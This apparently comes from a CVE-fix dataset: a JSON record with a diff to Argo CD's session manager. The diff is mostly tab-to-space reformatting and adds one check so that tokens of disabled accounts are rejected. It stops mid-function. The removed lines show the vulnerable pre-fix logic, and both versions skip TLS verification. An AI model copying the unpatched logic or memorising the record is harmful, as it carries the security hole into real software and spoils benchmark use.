{"cve":"CVE-2021-26921:0708", "fix_patch": "diff --git a/util/session/sessionmanager.go b/util/session/sessionmanager.go\nindex 2bd99f9fd..4999ceb2b 100644\n--- a/util/session/sessionmanager.go\n+++ b/util/session/sessionmanager.go\n@@ -1,590 +1,594 @@\n package session\n \n import (\n-\t\"context\"\n-\t\"encoding/json\"\n-\t\"errors\"\n-\t\"fmt\"\n-\t\"math\"\n-\t\"math/rand\"\n-\t\"net\"\n-\t\"net/http\"\n-\t\"os\"\n-\t\"time\"\n-\n-\toidc \"github.com/coreos/go-oidc\"\n-\t\"github.com/dgrijalva/jwt-go/v4\"\n-\tlog \"github.com/sirupsen/logrus\"\n-\t\"google.golang.org/grpc/codes\"\n-\t\"google.golang.org/grpc/status\"\n-\n-\t\"github.com/argoproj/argo-cd/common\"\n-\t\"github.com/argoproj/argo-cd/pkg/client/listers/application/v1alpha1\"\n-\t\"github.com/argoproj/argo-cd/server/rbacpolicy\"\n-\t\"github.com/argoproj/argo-cd/util/cache/appstate\"\n-\t\"github.com/argoproj/argo-cd/util/dex\"\n-\t\"github.com/argoproj/argo-cd/util/env\"\n-\thttputil \"github.com/argoproj/argo-cd/util/http\"\n-\tjwtutil \"github.com/argoproj/argo-cd/util/jwt\"\n-\toidcutil \"github.com/argoproj/argo-cd/util/oidc\"\n-\tpasswordutil \"github.com/argoproj/argo-cd/util/password\"\n-\t\"github.com/argoproj/argo-cd/util/settings\"\n+        \"context\"\n+        \"encoding/json\"\n+        \"errors\"\n+        \"fmt\"\n+        \"math\"\n+        \"math/rand\"\n+        \"net\"\n+        \"net/http\"\n+        \"os\"\n+        \"time\"\n+\n+        oidc \"github.com/coreos/go-oidc\"\n+        \"github.com/dgrijalva/jwt-go/v4\"\n+        log \"github.com/sirupsen/logrus\"\n+        \"google.golang.org/grpc/codes\"\n+        \"google.golang.org/grpc/status\"\n+\n+        \"github.com/argoproj/argo-cd/common\"\n+        \"github.com/argoproj/argo-cd/pkg/client/listers/application/v1alpha1\"\n+        \"github.com/argoproj/argo-cd/server/rbacpolicy\"\n+        \"github.com/argoproj/argo-cd/util/cache/appstate\"\n+        \"github.com/argoproj/argo-cd/util/dex\"\n+        \"github.com/argoproj/argo-cd/util/env\"\n+        httputil \"github.com/argoproj/argo-cd/util/http\"\n+        jwtutil \"github.com/argoproj/argo-cd/util/jwt\"\n+        oidcutil \"github.com/argoproj/argo-cd/util/oidc\"\n+        passwordutil \"github.com/argoproj/argo-cd/util/password\"\n+        \"github.com/argoproj/argo-cd/util/settings\"\n )\n \n // SessionManager generates and validates JWT tokens for login sessions.\n type SessionManager struct {\n-\tsettingsMgr                   *settings.SettingsManager\n-\tprojectsLister                v1alpha1.AppProjectNamespaceLister\n-\tclient                        *http.Client\n-\tprov                          oidcutil.Provider\n-\tstorage                       UserStateStorage\n-\tsleep                         func(d time.Duration)\n-\tverificationDelayNoiseEnabled bool\n+        settingsMgr                   *settings.SettingsManager\n+        projectsLister                v1alpha1.AppProjectNamespaceLister\n+        client                        *http.Client\n+        prov                          oidcutil.Provider\n+        storage                       UserStateStorage\n+        sleep                         func(d time.Duration)\n+        verificationDelayNoiseEnabled bool\n }\n \n type inMemoryUserStateStorage struct {\n-\tattempts map[string]LoginAttempts\n+        attempts map[string]LoginAttempts\n }\n \n func NewInMemoryUserStateStorage() *inMemoryUserStateStorage {\n-\treturn &inMemoryUserStateStorage{attempts: map[string]LoginAttempts{}}\n+        return &inMemoryUserStateStorage{attempts: map[string]LoginAttempts{}}\n }\n \n func (storage *inMemoryUserStateStorage) GetLoginAttempts(attempts *map[string]LoginAttempts) error {\n-\t*attempts = storage.attempts\n-\treturn nil\n+        *attempts = storage.attempts\n+        return nil\n }\n \n func (storage *inMemoryUserStateStorage) SetLoginAttempts(attempts map[string]LoginAttempts) error {\n-\tstorage.attempts = attempts\n-\treturn nil\n+        storage.attempts = attempts\n+        return nil\n }\n \n type UserStateStorage interface {\n-\tGetLoginAttempts(attempts *map[string]LoginAttempts) error\n-\tSetLoginAttempts(attempts map[string]LoginAttempts) error\n+        GetLoginAttempts(attempts *map[string]LoginAttempts) error\n+        SetLoginAttempts(attempts map[string]LoginAttempts) error\n }\n \n // LoginAttempts is a timestamped counter for failed login attempts\n type LoginAttempts struct {\n-\t// Time of the last failed login\n-\tLastFailed time.Time `json:\"lastFailed\"`\n-\t// Number of consecutive login failures\n-\tFailCount int `json:\"failCount\"`\n+        // Time of the last failed login\n+        LastFailed time.Time `json:\"lastFailed\"`\n+        // Number of consecutive login failures\n+        FailCount int `json:\"failCount\"`\n }\n \n const (\n-\t// SessionManagerClaimsIssuer fills the \"iss\" field of the token.\n-\tSessionManagerClaimsIssuer = \"argocd\"\n-\n-\t// invalidLoginError, for security purposes, doesn't say whether the username or password was invalid.  This does not mitigate the potential for timing attacks to determine which is which.\n-\tinvalidLoginError         = \"Invalid username or password\"\n-\tblankPasswordError        = \"Blank passwords are not allowed\"\n-\taccountDisabled           = \"Account %s is disabled\"\n-\tusernameTooLongError      = \"Username is too long (%d bytes max)\"\n-\tuserDoesNotHaveCapability = \"Account %s does not have %s capability\"\n+        // SessionManagerClaimsIssuer fills the \"iss\" field of the token.\n+        SessionManagerClaimsIssuer = \"argocd\"\n+\n+        // invalidLoginError, for security purposes, doesn't say whether the username or password was invalid.  This does not mitigate the potential for timing attacks to determine which is which.\n+        invalidLoginError         = \"Invalid username or password\"\n+        blankPasswordError        = \"Blank passwords are not allowed\"\n+        accountDisabled           = \"Account %s is disabled\"\n+        usernameTooLongError      = \"Username is too long (%d bytes max)\"\n+        userDoesNotHaveCapability = \"Account %s does not have %s capability\"\n )\n \n const (\n-\t// Maximum length of username, too keep the cache's memory signature low\n-\tmaxUsernameLength = 32\n-\t// The default maximum session cache size\n-\tdefaultMaxCacheSize = 1000\n-\t// The default number of maximum login failures before delay kicks in\n-\tdefaultMaxLoginFailures = 5\n-\t// The default time in seconds for the failure window\n-\tdefaultFailureWindow = 300\n-\t// The password verification delay max\n-\tverificationDelayNoiseMin = 500 * time.Millisecond\n-\t// The password verification delay max\n-\tverificationDelayNoiseMax = 1000 * time.Millisecond\n-\n-\t// environment variables to control rate limiter behaviour:\n-\n-\t// Max number of login failures before login delay kicks in\n-\tenvLoginMaxFailCount = \"ARGOCD_SESSION_FAILURE_MAX_FAIL_COUNT\"\n-\n-\t// Number of maximum seconds the login is allowed to delay for. Default: 300 (5 minutes).\n-\tenvLoginFailureWindowSeconds = \"ARGOCD_SESSION_FAILURE_WINDOW_SECONDS\"\n-\n-\t// Max number of stored usernames\n-\tenvLoginMaxCacheSize = \"ARGOCD_SESSION_MAX_CACHE_SIZE\"\n+        // Maximum length of username, too keep the cache's memory signature low\n+        maxUsernameLength = 32\n+        // The default maximum session cache size\n+        defaultMaxCacheSize = 1000\n+        // The default number of maximum login failures before delay kicks in\n+        defaultMaxLoginFailures = 5\n+        // The default time in seconds for the failure window\n+        defaultFailureWindow = 300\n+        // The password verification delay max\n+        verificationDelayNoiseMin = 500 * time.Millisecond\n+        // The password verification delay max\n+        verificationDelayNoiseMax = 1000 * time.Millisecond\n+\n+        // environment variables to control rate limiter behaviour:\n+\n+        // Max number of login failures before login delay kicks in\n+        envLoginMaxFailCount = \"ARGOCD_SESSION_FAILURE_MAX_FAIL_COUNT\"\n+\n+        // Number of maximum seconds the login is allowed to delay for. Default: 300 (5 minutes).\n+        envLoginFailureWindowSeconds = \"ARGOCD_SESSION_FAILURE_WINDOW_SECONDS\"\n+\n+        // Max number of stored usernames\n+        envLoginMaxCacheSize = \"ARGOCD_SESSION_MAX_CACHE_SIZE\"\n )\n \n var (\n-\tInvalidLoginErr = status.Errorf(codes.Unauthenticated, invalidLoginError)\n+        InvalidLoginErr = status.Errorf(codes.Unauthenticated, invalidLoginError)\n )\n \n // Returns the maximum cache size as number of entries\n func getMaximumCacheSize() int {\n-\treturn env.ParseNumFromEnv(envLoginMaxCacheSize, defaultMaxCacheSize, 1, math.MaxInt32)\n+        return env.ParseNumFromEnv(envLoginMaxCacheSize, defaultMaxCacheSize, 1, math.MaxInt32)\n }\n \n // Returns the maximum number of login failures before login delay kicks in\n func getMaxLoginFailures() int {\n-\treturn env.ParseNumFromEnv(envLoginMaxFailCount, defaultMaxLoginFailures, 1, math.MaxInt32)\n+        return env.ParseNumFromEnv(envLoginMaxFailCount, defaultMaxLoginFailures, 1, math.MaxInt32)\n }\n \n // Returns the number of maximum seconds the login is allowed to delay for\n func getLoginFailureWindow() time.Duration {\n-\treturn time.Duration(env.ParseNumFromEnv(envLoginFailureWindowSeconds, defaultFailureWindow, 0, math.MaxInt32))\n+        return time.Duration(env.ParseNumFromEnv(envLoginFailureWindowSeconds, defaultFailureWindow, 0, math.MaxInt32))\n }\n \n // NewSessionManager creates a new session manager from Argo CD settings\n func NewSessionManager(settingsMgr *settings.SettingsManager, projectsLister v1alpha1.AppProjectNamespaceLister, dexServerAddr string, storage UserStateStorage) *SessionManager {\n-\ts := SessionManager{\n-\t\tsettingsMgr:                   settingsMgr,\n-\t\tstorage:                       storage,\n-\t\tsleep:                         time.Sleep,\n-\t\tprojectsLister:                projectsLister,\n-\t\tverificationDelayNoiseEnabled: true,\n-\t}\n-\tsettings, err := settingsMgr.GetSettings()\n-\tif err != nil {\n-\t\tpanic(err)\n-\t}\n-\ttlsConfig := settings.TLSConfig()\n-\tif tlsConfig != nil {\n-\t\ttlsConfig.InsecureSkipVerify = true\n-\t}\n-\ts.client = &http.Client{\n-\t\tTransport: &http.Transport{\n-\t\t\tTLSClientConfig: tlsConfig,\n-\t\t\tProxy:           http.ProxyFromEnvironment,\n-\t\t\tDial: (&net.Dialer{\n-\t\t\t\tTimeout:   30 * time.Second,\n-\t\t\t\tKeepAlive: 30 * time.Second,\n-\t\t\t}).Dial,\n-\t\t\tTLSHandshakeTimeout:   10 * time.Second,\n-\t\t\tExpectContinueTimeout: 1 * time.Second,\n-\t\t},\n-\t}\n-\tif settings.DexConfig != \"\" {\n-\t\ts.client.Transport = dex.NewDexRewriteURLRoundTripper(dexServerAddr, s.client.Transport)\n-\t}\n-\tif os.Getenv(common.EnvVarSSODebug) == \"1\" {\n-\t\ts.client.Transport = httputil.DebugTransport{T: s.client.Transport}\n-\t}\n-\n-\treturn &s\n+        s := SessionManager{\n+                settingsMgr:                   settingsMgr,\n+                storage:                       storage,\n+                sleep:                         time.Sleep,\n+                projectsLister:                projectsLister,\n+                verificationDelayNoiseEnabled: true,\n+        }\n+        settings, err := settingsMgr.GetSettings()\n+        if err != nil {\n+                panic(err)\n+        }\n+        tlsConfig := settings.TLSConfig()\n+        if tlsConfig != nil {\n+                tlsConfig.InsecureSkipVerify = true\n+        }\n+        s.client = &http.Client{\n+                Transport: &http.Transport{\n+                        TLSClientConfig: tlsConfig,\n+                        Proxy:           http.ProxyFromEnvironment,\n+                        Dial: (&net.Dialer{\n+                                Timeout:   30 * time.Second,\n+                                KeepAlive: 30 * time.Second,\n+                        }).Dial,\n+                        TLSHandshakeTimeout:   10 * time.Second,\n+                        ExpectContinueTimeout: 1 * time.Second,\n+                },\n+        }\n+        if settings.DexConfig != \"\" {\n+                s.client.Transport = dex.NewDexRewriteURLRoundTripper(dexServerAddr, s.client.Transport)\n+        }\n+        if os.Getenv(common.EnvVarSSODebug) == \"1\" {\n+                s.client.Transport = httputil.DebugTransport{T: s.client.Transport}\n+        }\n+\n+        return &s\n }\n \n // Create creates a new token for a given subject (user) and returns it as a string.\n // Passing a value of `0` for secondsBeforeExpiry creates a token that never expires.\n // The id parameter holds an optional unique JWT token identifier and stored as a standard claim \"jti\" in the JWT token.\n func (mgr *SessionManager) Create(subject string, secondsBeforeExpiry int64, id string) (string, error) {\n-\t// Create a new token object, specifying signing method and the claims\n-\t// you would like it to contain.\n-\tnow := time.Now().UTC()\n-\tclaims := jwt.StandardClaims{\n-\t\tIssuedAt:  jwt.At(now),\n-\t\tIssuer:    SessionManagerClaimsIssuer,\n-\t\tNotBefore: jwt.At(now),\n-\t\tSubject:   subject,\n-\t\tID:        id,\n-\t}\n-\tif secondsBeforeExpiry > 0 {\n-\t\texpires := now.Add(time.Duration(secondsBeforeExpiry) * time.Second)\n-\t\tclaims.ExpiresAt = jwt.At(expires)\n-\t}\n-\n-\treturn mgr.signClaims(claims)\n+        // Create a new token object, specifying signing method and the claims\n+        // you would like it to contain.\n+        now := time.Now().UTC()\n+        claims := jwt.StandardClaims{\n+                IssuedAt:  jwt.At(now),\n+                Issuer:    SessionManagerClaimsIssuer,\n+                NotBefore: jwt.At(now),\n+                Subject:   subject,\n+                ID:        id,\n+        }\n+        if secondsBeforeExpiry > 0 {\n+                expires := now.Add(time.Duration(secondsBeforeExpiry) * time.Second)\n+                claims.ExpiresAt = jwt.At(expires)\n+        }\n+\n+        return mgr.signClaims(claims)\n }\n \n type standardClaims struct {\n-\tAudience  jwt.ClaimStrings `json:\"aud,omitempty\"`\n-\tExpiresAt int64            `json:\"exp,omitempty\"`\n-\tID        string           `json:\"jti,omitempty\"`\n-\tIssuedAt  int64            `json:\"iat,omitempty\"`\n-\tIssuer    string           `json:\"iss,omitempty\"`\n-\tNotBefore int64            `json:\"nbf,omitempty\"`\n-\tSubject   string           `json:\"sub,omitempty\"`\n+        Audience  jwt.ClaimStrings `json:\"aud,omitempty\"`\n+        ExpiresAt int64            `json:\"exp,omitempty\"`\n+        ID        string           `json:\"jti,omitempty\"`\n+        IssuedAt  int64            `json:\"iat,omitempty\"`\n+        Issuer    string           `json:\"iss,omitempty\"`\n+        NotBefore int64            `json:\"nbf,omitempty\"`\n+        Subject   string           `json:\"sub,omitempty\"`\n }\n \n func unixTimeOrZero(t *jwt.Time) int64 {\n-\tif t == nil {\n-\t\treturn 0\n-\t}\n-\treturn t.Unix()\n+        if t == nil {\n+                return 0\n+        }\n+        return t.Unix()\n }\n \n func (mgr *SessionManager) signClaims(claims jwt.Claims) (string, error) {\n-\t// log.Infof(\"Issuing claims: %v\", claims)\n-\ttoken := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)\n-\tsettings, err := mgr.settingsMgr.GetSettings()\n-\tif err != nil {\n-\t\treturn \"\", err\n-\t}\n-\t// workaround for https://github.com/argoproj/argo-cd/issues/5217\n-\t// According to https://tools.ietf.org/html/rfc7519#section-4.1.6 \"iat\" and other time fields must contain\n-\t// number of seconds from 1970-01-01T00:00:00Z UTC until the specified UTC date/time.\n-\t// The https://github.com/dgrijalva/jwt-go marshals time as non integer.\n-\treturn token.SignedString(settings.ServerSignature, jwt.WithMarshaller(func(ctx jwt.CodingContext, v interface{}) ([]byte, error) {\n-\t\tif std, ok := v.(jwt.StandardClaims); ok {\n-\t\t\treturn json.Marshal(standardClaims{\n-\t\t\t\tAudience:  std.Audience,\n-\t\t\t\tExpiresAt: unixTimeOrZero(std.ExpiresAt),\n-\t\t\t\tID:        std.ID,\n-\t\t\t\tIssuedAt:  unixTimeOrZero(std.IssuedAt),\n-\t\t\t\tIssuer:    std.Issuer,\n-\t\t\t\tNotBefore: unixTimeOrZero(std.NotBefore),\n-\t\t\t\tSubject:   std.Subject,\n-\t\t\t})\n-\t\t}\n-\t\treturn json.Marshal(v)\n-\t}))\n+        // log.Infof(\"Issuing claims: %v\", claims)\n+        token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)\n+        settings, err := mgr.settingsMgr.GetSettings()\n+        if err != nil {\n+                return \"\", err\n+        }\n+        // workaround for https://github.com/argoproj/argo-cd/issues/5217\n+        // According to https://tools.ietf.org/html/rfc7519#section-4.1.6 \"iat\" and other time fields must contain\n+        // number of seconds from 1970-01-01T00:00:00Z UTC until the specified UTC date/time.\n+        // The https://github.com/dgrijalva/jwt-go marshals time as non integer.\n+        return token.SignedString(settings.ServerSignature, jwt.WithMarshaller(func(ctx jwt.CodingContext, v interface{}) ([]byte, error) {\n+                if std, ok := v.(jwt.StandardClaims); ok {\n+                        return json.Marshal(standardClaims{\n+                                Audience:  std.Audience,\n+                                ExpiresAt: unixTimeOrZero(std.ExpiresAt),\n+                                ID:        std.ID,\n+                                IssuedAt:  unixTimeOrZero(std.IssuedAt),\n+                                Issuer:    std.Issuer,\n+                                NotBefore: unixTimeOrZero(std.NotBefore),\n+                                Subject:   std.Subject,\n+                        })\n+                }\n+                return json.Marshal(v)\n+        }))\n }\n \n // Parse tries to parse the provided string and returns the token claims for local login.\n func (mgr *SessionManager) Parse(tokenString string) (jwt.Claims, error) {\n-\t// Parse takes the token string and a function for looking up the key. The latter is especially\n-\t// useful if you use multiple keys for your application.  The standard is to use 'kid' in the\n-\t// head of the token to identify which key to use, but the parsed token (head and claims) is provided\n-\t// to the callback, providing flexibility.\n-\tvar claims jwt.MapClaims\n-\tsettings, err := mgr.settingsMgr.GetSettings()\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\ttoken, err := jwt.ParseWithClaims(tokenString, &claims, func(token *jwt.Token) (interface{}, error) {\n-\t\t// Don't forget to validate the alg is what you expect:\n-\t\tif _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {\n-\t\t\treturn nil, fmt.Errorf(\"Unexpected signing method: %v\", token.Header[\"alg\"])\n-\t\t}\n-\t\treturn settings.ServerSignature, nil\n-\t})\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tissuedAt, err := jwtutil.IssuedAtTime(claims)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tsubject := jwtutil.StringField(claims, \"sub\")\n-\tid := jwtutil.StringField(claims, \"jti\")\n-\n-\tif projName, role, ok := rbacpolicy.GetProjectRoleFromSubject(subject); ok {\n-\t\tproj, err := mgr.projectsLister.Get(projName)\n-\t\tif err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\t\t_, _, err = proj.GetJWTToken(role, issuedAt.Unix(), id)\n-\t\tif err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\n-\t\treturn token.Claims, nil\n-\t}\n-\n-\taccount, err := mgr.settingsMgr.GetAccount(subject)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tif id := jwtutil.StringField(claims, \"jti\"); id != \"\" && account.TokenIndex(id) == -1 {\n-\t\treturn nil, fmt.Errorf(\"account %s does not have token with id %s\", subject, id)\n-\t}\n-\n-\tif account.PasswordMtime != nil && issuedAt.Before(*account.PasswordMtime) {\n-\t\treturn nil, fmt.Errorf(\"Account password has changed since token issued\")\n-\t}\n-\treturn token.Claims, nil\n+        // Parse takes the token string and a function for looking up the key. The latter is especially\n+        // useful if you use multiple keys for your application.  The standard is to use 'kid' in the\n+        // head of the token to identify which key to use, but the parsed token (head and claims) is provided\n+        // to the callback, providing flexibility.\n+        var claims jwt.MapClaims\n+        settings, err := mgr.settingsMgr.GetSettings()\n+        if err != nil {\n+                return nil, err\n+        }\n+        token, err := jwt.ParseWithClaims(tokenString, &claims, func(token *jwt.Token) (interface{}, error) {\n+                // Don't forget to validate the alg is what you expect:\n+                if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {\n+                        return nil, fmt.Errorf(\"Unexpected signing method: %v\", token.Header[\"alg\"])\n+                }\n+                return settings.ServerSignature, nil\n+        })\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        issuedAt, err := jwtutil.IssuedAtTime(claims)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        subject := jwtutil.StringField(claims, \"sub\")\n+        id := jwtutil.StringField(claims, \"jti\")\n+\n+        if projName, role, ok := rbacpolicy.GetProjectRoleFromSubject(subject); ok {\n+                proj, err := mgr.projectsLister.Get(projName)\n+                if err != nil {\n+                        return nil, err\n+                }\n+                _, _, err = proj.GetJWTToken(role, issuedAt.Unix(), id)\n+                if err != nil {\n+                        return nil, err\n+                }\n+\n+                return token.Claims, nil\n+        }\n+\n+        account, err := mgr.settingsMgr.GetAccount(subject)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+if !account.Enabled {\n+return nil, fmt.Errorf(\"account %s is disabled\", subject)\n+}\n+\n+        if id := jwtutil.StringField(claims, \"jti\"); id != \"\" && account.TokenIndex(id) == -1 {\n+                return nil, fmt.Errorf(\"account %s does not have token with id %s\", subject, id)\n+        }\n+\n+        if account.PasswordMtime != nil && issuedAt.Before(*account.PasswordMtime) {\n+                return nil, fmt.Errorf(\"Account password has changed since token issued\")\n+        }\n+        return token.Claims, nil\n }\n \n // GetLoginFailures retrieves the login failure information from the cache\n func (mgr *SessionManager) GetLoginFailures() map[string]LoginAttempts {\n-\t// Get failures from the cache\n-\tvar failures map[string]LoginAttempts\n-\terr := mgr.storage.GetLoginAttempts(&failures)\n-\tif err != nil {\n-\t\tif err != appstate.ErrCacheMiss {\n-\t\t\tlog.Errorf(\"Could not retrieve login attempts: %v\", err)\n-\t\t}\n-\t\tfailures = make(map[string]LoginAttempts)\n-\t}\n-\n-\treturn failures\n+        // Get failures from the cache\n+        var failures map[string]LoginAttempts\n+        err := mgr.storage.GetLoginAttempts(&failures)\n+        if err != nil {\n+                if err != appstate.ErrCacheMiss {\n+                        log.Errorf(\"Could not retrieve login attempts: %v\", err)\n+                }\n+                failures = make(map[string]LoginAttempts)\n+        }\n+\n+        return failures\n }\n \n func expireOldFailedAttempts(maxAge time.Duration, failures *map[string]LoginAttempts) int {\n-\texpiredCount := 0\n-\tfor key, attempt := range *failures {\n-\t\tif time.Since(attempt.LastFailed) > maxAge*time.Second {\n-\t\t\texpiredCount += 1\n-\t\t\tdelete(*failures, key)\n-\t\t}\n-\t}\n-\treturn expiredCount\n+        expiredCount := 0\n+        for key, attempt := range *failures {\n+                if time.Since(attempt.LastFailed) > maxAge*time.Second {\n+                        expiredCount += 1\n+                        delete(*failures, key)\n+                }\n+        }\n+        return expiredCount\n }\n \n // Updates the failure count for a given username. If failed is true, increases the counter. Otherwise, sets counter back to 0.\n func (mgr *SessionManager) updateFailureCount(username string, failed bool) {\n \n-\tfailures := mgr.GetLoginFailures()\n-\n-\t// Expire old entries in the cache if we have a failure window defined.\n-\tif window := getLoginFailureWindow(); window > 0 {\n-\t\tcount := expireOldFailedAttempts(window, &failures)\n-\t\tif count > 0 {\n-\t\t\tlog.Infof(\"Expired %d entries from session cache due to max age reached\", count)\n-\t\t}\n-\t}\n-\n-\t// If we exceed a certain cache size, we need to remove random entries to\n-\t// prevent overbloating the cache with fake entries, as this could lead to\n-\t// memory exhaustion and ultimately in a DoS. We remove a single entry to\n-\t// replace it with the new one.\n-\t//\n-\t// Chances are that we remove the one that is under active attack, but this\n-\t// chance is low (1:cache_size)\n-\tif failed && len(failures) >= getMaximumCacheSize() {\n-\t\tlog.Warnf(\"Session cache size exceeds %d entries, removing random entry\", getMaximumCacheSize())\n-\t\tidx := rand.Intn(len(failures) - 1)\n-\t\tvar rmUser string\n-\t\ti := 0\n-\t\tfor key := range failures {\n-\t\t\tif i == idx {\n-\t\t\t\trmUser = key\n-\t\t\t\tdelete(failures, key)\n-\t\t\t\tbreak\n-\t\t\t}\n-\t\t\ti++\n-\t\t}\n-\t\tlog.Infof(\"Deleted entry for user %s from cache\", rmUser)\n-\t}\n-\n-\tattempt, ok := failures[username]\n-\tif !ok {\n-\t\tattempt = LoginAttempts{FailCount: 0}\n-\t}\n-\n-\t// On login failure, increase fail count and update last failed timestamp.\n-\t// On login success, remove the entry from the cache.\n-\tif failed {\n-\t\tattempt.FailCount += 1\n-\t\tattempt.LastFailed = time.Now()\n-\t\tfailures[username] = attempt\n-\t\tlog.Warnf(\"User %s failed login %d time(s)\", username, attempt.FailCount)\n-\t} else {\n-\t\tif attempt.FailCount > 0 {\n-\t\t\t// Forget username for cache size enforcement, since entry in cache was deleted\n-\t\t\tdelete(failures, username)\n-\t\t}\n-\t}\n-\n-\terr := mgr.storage.SetLoginAttempts(failures)\n-\tif err != nil {\n-\t\tlog.Errorf(\"Could not update login attempts: %v\", err)\n-\t}\n+        failures := mgr.GetLoginFailures()\n+\n+        // Expire old entries in the cache if we have a failure window defined.\n+        if window := getLoginFailureWindow(); window > 0 {\n+                count := expireOldFailedAttempts(window, &failures)\n+                if count > 0 {\n+                        log.Infof(\"Expired %d entries from session cache due to max age reached\", count)\n+                }\n+        }\n+\n+        // If we exceed a certain cache size, we need to remove random entries to\n+        // prevent overbloating the cache with fake entries, as this could lead to\n+        // memory exhaustion and ultimately in a DoS. We remove a single entry to\n+        // replace it with the new one.\n+        //\n+        // Chances are that we remove the one that is under active attack, but this\n+        // chance is low (1:cache_size)\n+        if failed && len(failures) >= getMaximumCacheSize() {\n+                log.Warnf(\"Session cache size exceeds %d entries, removing random entry\", getMaximumCacheSize())\n+                idx := rand.Intn(len(failures) - 1)\n+                var rmUser string\n+                i := 0\n+                for key := range failures {\n+                        if i == idx {\n+                                rmUser = key\n+                                delete(failures, key)\n+                                break\n+                        }\n+                        i++\n+                }\n+                log.Infof(\"Deleted entry for user %s from cache\", rmUser)\n+        }\n+\n+        attempt, ok := failures[username]\n+        if !ok {\n+                attempt = LoginAttempts{FailCount: 0}\n+        }\n+\n+        // On login failure, increase fail count and update last failed timestamp.\n+        // On login success, remove the entry from the cache.\n+        if failed {\n+                attempt.FailCount += 1\n+                attempt.LastFailed = time.Now()\n+                failures[username] = attempt\n+                log.Warnf(\"User %s failed login %d time(s)\", username, attempt.FailCount)\n+        } else {\n+                if attempt.FailCount > 0 {\n+                        // Forget username for cache size enforcement, since entry in cache was deleted\n+                        delete(failures, username)\n+                }\n+        }\n+\n+        err := mgr.storage.SetLoginAttempts(failures)\n+        if err != nil {\n+                log.Errorf(\"Could not update login attempts: %v\", err)\n+        }\n \n }\n \n // Get the current login failure attempts for given username\n func (mgr *SessionManager) getFailureCount(username string) LoginAttempts {\n-\tfailures := mgr.GetLoginFailures()\n-\tattempt, ok := failures[username]\n-\tif !ok {\n-\t\tattempt = LoginAttempts{FailCount: 0}\n-\t}\n-\treturn attempt\n+        failures := mgr.GetLoginFailures()\n+        attempt, ok := failures[username]\n+        if !ok {\n+                attempt = LoginAttempts{FailCount: 0}\n+        }\n+        return attempt\n }\n \n // Calculate a login delay for the given login attempt\n func (mgr *SessionManager) exceededFailedLoginAttempts(attempt LoginAttempts) bool {\n-\tmaxFails := getMaxLoginFailures()\n-\tfailureWindow := getLoginFailureWindow()\n-\n-\t// Whether we are in the failure window for given attempt\n-\tinWindow := func() bool {\n-\t\tif failureWindow == 0 || time.Since(attempt.LastFailed).Seconds() <= float64(failureWindow) {\n-\t\t\treturn true\n-\t\t}\n-\t\treturn false\n-\t}\n-\n-\t// If we reached max failed attempts within failure window, we need to calc the delay\n-\tif attempt.FailCount >= maxFails && inWindow() {\n-\t\treturn true\n-\t}\n-\n-\treturn false\n+        maxFails := getMaxLoginFailures()\n+        failureWindow := getLoginFailureWindow()\n+\n+        // Whether we are in the failure window for given attempt\n+        inWindow := func() bool {\n+                if failureWindow == 0 || time.Since(attempt.LastFailed).Seconds() <= float64(failureWindow) {\n+                        return true\n+                }\n+                return false\n+        }\n+\n+        // If we reached max failed attempts within failure window, we need to calc the delay\n+        if attempt.FailCount >= maxFails && inWindow() {\n+                return true\n+        }\n+\n+        return false\n }\n \n // VerifyUsernamePassword verifies if a username/password combo is correct\n func (mgr *SessionManager) VerifyUsernamePassword(username string, password string) error {\n-\tif password == \"\" {\n-\t\treturn status.Errorf(codes.Unauthenticated, blankPasswordError)\n-\t}\n-\t// Enforce maximum length of username on local accounts\n-\tif len(username) > maxUsernameLength {\n-\t\treturn status.Errorf(codes.InvalidArgument, usernameTooLongError, maxUsernameLength)\n-\t}\n-\n-\tstart := time.Now()\n-\tif mgr.verificationDelayNoiseEnabled {\n-\t\tdefer func() {\n-\t\t\t// introduces random delay to protect from timing-based user enumeration attack\n-\t\t\tdelayNanoseconds := verificationDelayNoiseMin.Nanoseconds() +\n-\t\t\t\tint64(rand.Intn(int(verificationDelayNoiseMax.Nanoseconds()-verificationDelayNoiseMin.Nanoseconds())))\n-\t\t\t\t// take into account amount of time spent since the request start\n-\t\t\tdelayNanoseconds = delayNanoseconds - time.Since(start).Nanoseconds()\n-\t\t\tif delayNanoseconds > 0 {\n-\t\t\t\tmgr.sleep(time.Duration(delayNanoseconds))\n-\t\t\t}\n-\t\t}()\n-\t}\n-\n-\tattempt := mgr.getFailureCount(username)\n-\tif mgr.exceededFailedLoginAttempts(attempt) {\n-\t\tlog.Warnf(\"User %s had too many failed logins (%d)\", username, attempt.FailCount)\n-\t\treturn InvalidLoginErr\n-\t}\n-\n-\taccount, err := mgr.settingsMgr.GetAccount(username)\n-\tif err != nil {\n-\t\tif errStatus, ok := status.FromError(err); ok && errStatus.Code() == codes.NotFound {\n-\t\t\tmgr.updateFailureCount(username, true)\n-\t\t\terr = InvalidLoginErr\n-\t\t}\n-\t\t// to prevent time-based user enumeration, we must perform a password\n-\t\t// hash cycle to keep response time consistent (if the function were\n-\t\t// to continue and not return here)\n-\t\t_, _ = passwordutil.HashPassword(\"for_consistent_response_time\")\n-\t\treturn err\n-\t}\n-\n-\tvalid, _ := passwordutil.VerifyPassword(password, account.PasswordHash)\n-\tif !valid {\n-\t\tmgr.updateFailureCount(username, true)\n-\t\treturn InvalidLoginErr\n-\t}\n-\n-\tif !account.Enabled {\n-\t\treturn status.Errorf(codes.Unauthenticated, accountDisabled, username)\n-\t}\n-\n-\tif !account.HasCapability(settings.AccountCapabilityLogin) {\n-\t\treturn status.Errorf(codes.Unauthenticated, userDoesNotHaveCapability, username, settings.AccountCapabilityLogin)\n-\t}\n-\tmgr.updateFailureCount(username, false)\n-\treturn nil\n+        if password == \"\" {\n+                return status.Errorf(codes.Unauthenticated, blankPasswordError)\n+        }\n+        // Enforce maximum length of username on local accounts\n+        if len(username) > maxUsernameLength {\n+                return 